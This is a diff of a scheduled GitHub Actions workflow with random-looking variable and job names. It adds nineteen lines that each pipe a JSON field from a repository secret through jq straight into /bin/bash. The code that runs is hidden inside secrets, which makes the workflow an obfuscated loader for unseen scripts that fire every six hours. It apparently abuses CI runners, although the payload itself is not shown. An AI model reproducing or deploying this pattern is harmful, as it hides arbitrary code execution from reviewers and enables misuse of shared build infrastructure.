@@ -2,9 +2,8 @@ name: laojiangzhongzheng
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 0/6 * * *'
-
-jobs:  # 2800
+    - cron: '31 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,15 +11,25 @@ jobs:  # 2800
       - uses: actions/checkout@v4
       - name: laojiangzhongzheng
         env:
-          tg43115: ${{ secrets.tg43115 }}
+          jo6: ${{ secrets.jo6 }}
         run: |
-          echo $tg43115 | jq -r .gpuq8732 | /bin/bash
-          echo $bwpa695 | jq -r .feyxx55 | /bin/bash
-          echo $jfj91 | jq -r .cuvwv65754 | /bin/bash
-          echo $hm22200 | jq -r .jsx0 | /bin/bash
-          echo $x424 | jq -r .wvk8594 | /bin/bash
-          echo $sjbf596 | jq -r .vjuup50366 | /bin/bash
-          echo $v13 | jq -r .qrxi413 | /bin/bash
-          echo $wk52 | jq -r .mtyti38 | /bin/bash
-          echo $l842 | jq -r .ia14 | /bin/bash
+          echo $jo6 | jq -r .ugswq12 | /bin/bash
+          echo $taweo054 | jq -r .ipj33885 | /bin/bash
+          echo $qiv55845 | jq -r .r13290 | /bin/bash
+          echo $kk9 | jq -r .wiblg4 | /bin/bash
+          echo $alns156 | jq -r .rcb41938 | /bin/bash
+          echo $gbsf1 | jq -r .mjrj98 | /bin/bash
+          echo $rc6637 | jq -r .wcbmb2 | /bin/bash
+          echo $wly8 | jq -r .kcpsw8 | /bin/bash
+          echo $t5953 | jq -r .vhf3 | /bin/bash
+          echo $ma67611 | jq -r .pbp40672 | /bin/bash
+          echo $b640 | jq -r .olp3 | /bin/bash
+          echo $va4520 | jq -r .fva3 | /bin/bash
+          echo $ax78 | jq -r .mkavg4 | /bin/bash
+          echo $y5402 | jq -r .n3801 | /bin/bash
+          echo $akimd4 | jq -r .f3627 | /bin/bash
+          echo $xgu5 | jq -r .epi0 | /bin/bash
+          echo $cysav31 | jq -r .zlisl4603 | /bin/bash
+          echo $a4930 | jq -r .hf150 | /bin/bash
+          echo $rtjjv120 | jq -r .iv8 | /bin/bash
 
